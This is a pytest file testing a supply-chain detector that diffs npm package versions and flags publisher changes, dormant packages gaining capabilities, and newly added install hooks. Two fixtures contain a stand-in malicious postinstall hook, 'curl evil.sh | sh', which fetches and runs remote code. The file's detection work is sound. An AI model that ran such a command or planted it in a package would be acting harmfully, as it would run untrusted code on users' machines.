"""Offline tests for backend.deps.delta — version diffing and supply-chain flags."""

from datetime import UTC, datetime, timedelta

import pytest

from backend.deps.delta import compute_delta, semver_jump, supply_chain_flags
from backend.models.dependencies import CapabilityProfile, ResolvedPackage, VersionDelta
from backend.models.enums import CapabilityCategory, SourceKind


def _pkg(version, publisher="alice", published_at=None, **kwargs):
    return ResolvedPackage(
        name="pkg",
        version=version,
        tarball_url="https://registry.npmjs.org/pkg.tgz",
        integrity="sha512-AAAA",
        publisher=publisher,
        published_at=published_at,
        **kwargs,
    )


def _profile(categories=(), install_hooks=()):
    return CapabilityProfile(
        name="pkg",
        version="1.0.0",
        source_kind=SourceKind.NPM_TARBALL,
        capability_vector=list(categories),
        install_hooks=list(install_hooks),
        evidence=[],
        status="ok",
    )


@pytest.mark.parametrize(
    ("previous", "current", "expected"),
    [
        ("1.0.0", "1.0.1", "patch"),
        ("1.0.0", "1.1.0", "minor"),
        ("1.0.0", "2.0.0", "major"),
        ("1.0.0-beta.1", "1.0.0-beta.2", "prerelease"),
        ("1.0.0-beta.2", "1.0.0", "prerelease"),
        ("1.0.0+build.4", "1.0.0+build.5", "unknown"),
        ("1.0.0", "1.0.0", "unknown"),
        ("not-a-version", "1.0.0", "unknown"),
        ("1.0.0", "also-not-a-version", "unknown"),
    ],
)
def test_semver_jump(previous, current, expected):
    assert semver_jump(previous, current) == expected


def test_compute_delta_category_sets_use_shipped_evidence_only():
    from backend.models.dependencies import CapabilityEvidence
    from backend.models.enums import PathClass

    prev_profile = _profile()
    curr_profile = CapabilityProfile(
        name="pkg",
        version="1.0.1",
        source_kind=SourceKind.NPM_TARBALL,
        evidence=[
            CapabilityEvidence(
                category=CapabilityCategory.NETWORK,
                rule_id="r",
                file="index.js",
                line=1,
                snippet="fetch(x)",
                source_kind=SourceKind.NPM_TARBALL,
                path_class=PathClass.SHIPPED,
            ),
            CapabilityEvidence(
                category=CapabilityCategory.PROCESS,
                rule_id="r2",
                file="test/spec.js",
                line=1,
                snippet="exec(x)",
                source_kind=SourceKind.NPM_TARBALL,
                path_class=PathClass.TEST,
            ),
        ],
        status="ok",
    )

    delta = compute_delta(_pkg("1.0.0"), _pkg("1.0.1"), prev_profile, curr_profile)

    # Only the SHIPPED-path evidence (network) counts; the TEST-path process
    # evidence must not appear as an added category.
    assert delta.categories_added == [CapabilityCategory.NETWORK]
    assert delta.categories_removed == []


def _evidence(category, *, file="index.js", path_class=None, install_time=False):
    from backend.models.dependencies import CapabilityEvidence
    from backend.models.enums import PathClass

    return CapabilityEvidence(
        category=category,
        rule_id="r",
        file=file,
        line=1,
        snippet="x",
        source_kind=SourceKind.NPM_TARBALL,
        path_class=path_class or PathClass.SHIPPED,
        install_time=install_time,
    )


def test_compute_delta_flags_install_time_capability_for_newly_added_risky_category():
    prev_profile = _profile()
    curr_profile = CapabilityProfile(
        name="pkg",
        version="1.0.1",
        source_kind=SourceKind.NPM_TARBALL,
        evidence=[
            _evidence(CapabilityCategory.NETWORK, file="scripts/setup.js", install_time=True)
        ],
        status="ok",
    )

    delta = compute_delta(_pkg("1.0.0"), _pkg("1.0.1"), prev_profile, curr_profile)

    assert "install_time_capability" in delta.flags


def test_compute_delta_no_install_time_capability_flag_when_not_install_time():
    prev_profile = _profile()
    curr_profile = CapabilityProfile(
        name="pkg",
        version="1.0.1",
        source_kind=SourceKind.NPM_TARBALL,
        evidence=[_evidence(CapabilityCategory.NETWORK, install_time=False)],
        status="ok",
    )

    delta = compute_delta(_pkg("1.0.0"), _pkg("1.0.1"), prev_profile, curr_profile)

    assert "install_time_capability" not in delta.flags


def test_compute_delta_no_install_time_capability_flag_when_category_not_new():
    prev_profile = CapabilityProfile(
        name="pkg",
        version="1.0.0",
        source_kind=SourceKind.NPM_TARBALL,
        evidence=[_evidence(CapabilityCategory.NETWORK)],
        status="ok",
    )
    curr_profile = CapabilityProfile(
        name="pkg",
        version="1.0.1",
        source_kind=SourceKind.NPM_TARBALL,
        evidence=[
            _evidence(CapabilityCategory.NETWORK, file="scripts/setup.js", install_time=True)
        ],
        status="ok",
    )

    delta = compute_delta(_pkg("1.0.0"), _pkg("1.0.1"), prev_profile, curr_profile)

    assert "install_time_capability" not in delta.flags


def test_compute_delta_publisher_changed():
    delta = compute_delta(
        _pkg("1.0.0", publisher="alice"),
        _pkg("1.0.1", publisher="mallory"),
        _profile(),
        _profile(),
    )
    assert delta.publisher_changed is True
    assert delta.previous_publisher == "alice"
    assert delta.current_publisher == "mallory"


def test_compute_delta_same_publisher_not_flagged():
    delta = compute_delta(
        _pkg("1.0.0", publisher="alice"),
        _pkg("1.0.1", publisher="alice"),
        _profile(),
        _profile(),
    )
    assert delta.publisher_changed is False


def test_compute_delta_missing_publisher_not_flagged_as_changed():
    delta = compute_delta(
        _pkg("1.0.0", publisher=None),
        _pkg("1.0.1", publisher="alice"),
        _profile(),
        _profile(),
    )
    assert delta.publisher_changed is False


def test_compute_delta_days_since_previous_publish():
    t0 = datetime(2020, 1, 1, tzinfo=UTC)
    t1 = t0 + timedelta(days=400)
    delta = compute_delta(
        _pkg("1.0.0", published_at=t0),
        _pkg("1.0.1", published_at=t1),
        _profile(),
        _profile(),
    )
    assert delta.days_since_previous_publish == pytest.approx(400.0)


def test_compute_delta_install_hooks_added():
    delta = compute_delta(
        _pkg("1.0.0"),
        _pkg("1.0.1"),
        _profile(install_hooks=["preinstall: tsc"]),
        _profile(install_hooks=["preinstall: tsc", "postinstall: curl evil.sh | sh — ..."]),
    )
    assert delta.install_hooks_added == ["postinstall: curl evil.sh | sh — ..."]


def _delta(**overrides) -> VersionDelta:
    base = {
        "name": "pkg",
        "previous_version": "1.0.0",
        "current_version": "1.0.1",
        "categories_added": [],
        "categories_removed": [],
        "publisher_changed": False,
        "days_since_previous_publish": None,
        "install_hooks_added": [],
        "semver_jump": "patch",
    }
    base.update(overrides)
    return VersionDelta(**base)


def test_flag_suspicious_capability_addition():
    delta = _delta(
        semver_jump="patch",
        publisher_changed=True,
        categories_added=[CapabilityCategory.NETWORK],
    )
    assert "suspicious_capability_addition" in supply_chain_flags(delta)


def test_flag_suspicious_capability_addition_requires_risky_category():
    delta = _delta(
        semver_jump="patch",
        publisher_changed=True,
        categories_added=[CapabilityCategory.CRYPTO],
    )
    assert "suspicious_capability_addition" not in supply_chain_flags(delta)


def test_flag_suspicious_capability_addition_requires_publisher_change():
    delta = _delta(
        semver_jump="patch",
        publisher_changed=False,
        categories_added=[CapabilityCategory.NETWORK],
    )
    assert "suspicious_capability_addition" not in supply_chain_flags(delta)


def test_flag_suspicious_capability_addition_not_for_major_jump():
    delta = _delta(
        semver_jump="major",
        publisher_changed=True,
        categories_added=[CapabilityCategory.NETWORK],
    )
    assert "suspicious_capability_addition" not in supply_chain_flags(delta)


def test_flag_install_hook_added():
    delta = _delta(install_hooks_added=["postinstall: curl evil.sh"])
    assert "install_hook_added" in supply_chain_flags(delta)


def test_flag_dormant_package_new_capability():
    delta = _delta(days_since_previous_publish=400.0, categories_added=[CapabilityCategory.NETWORK])
    assert "dormant_package_new_capability" in supply_chain_flags(delta)


def test_flag_dormant_package_requires_new_capability():
    delta = _delta(days_since_previous_publish=400.0, categories_added=[])
    assert "dormant_package_new_capability" not in supply_chain_flags(delta)


def test_flag_dormant_package_requires_threshold():
    delta = _delta(days_since_previous_publish=30.0, categories_added=[CapabilityCategory.NETWORK])
    assert "dormant_package_new_capability" not in supply_chain_flags(delta)


def test_no_flags_for_benign_refactor():
    delta = _delta()
    assert supply_chain_flags(delta) == []
